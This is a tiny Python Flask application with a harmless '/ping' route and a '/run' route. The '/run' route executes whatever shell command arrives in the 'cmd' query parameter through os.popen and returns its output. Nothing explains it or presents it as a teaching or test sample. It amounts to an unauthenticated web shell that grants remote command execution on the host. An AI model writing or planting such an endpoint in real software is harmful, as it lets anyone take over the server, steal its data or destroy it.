import os
from flask import Flask, request

app = Flask(__name__)

@app.route("/ping")
def ping():
    return "Pong"

@app.route("/run")
def run():
    command = request.args.get("cmd")
    return os.popen(command).read()
